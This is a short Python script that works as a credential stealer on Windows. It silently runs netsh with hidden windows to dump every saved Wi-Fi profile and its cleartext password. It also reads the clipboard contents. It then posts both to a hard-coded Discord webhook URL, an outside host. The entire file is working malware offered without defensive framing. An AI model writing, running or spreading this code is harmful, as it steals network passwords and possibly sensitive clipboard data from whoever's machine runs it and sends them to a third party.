import os
import subprocess
import pyperclip
import requests
import json

def get_networks():
    networks = {}
    
    try:
        output_networks = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"], creationflags=subprocess.CREATE_NO_WINDOW
        ).decode(errors="ignore")

        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]

        for profile in profiles:
            if profile:
                network_info = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode(errors="ignore")

                password = extract_password(network_info)
                networks[profile] = password if password else "nopwd"

    except Exception as e:
        print(f"Error retrieving networks: {e}")

    return networks

def extract_password(network_info):
    for line in network_info.split("\n"):
        if "Key Content" in line:
            return line.split(":")[1].strip()
    return None

def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        print(f"Error retrieving clipboard content: {e}")
        return "Unable to fetch clipboard content."

if __name__ == "__main__":
    wifi_passwords = get_networks()
    clipboard_data = get_clipboard_content()
    url = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"
    for wifi, password in wifi_passwords.items():
        p1 = {"content":f"{wifi}: {password}"}
        response = requests.post(url, data=json.dumps(p1),headers={"Content-Type": "application/json"})
    p2 = {"content":f"Clipboard: {clipboard_data}"}
    response = requests.post(url, data=json.dumps(p2),headers={"Content-Type": "application/json"})
    
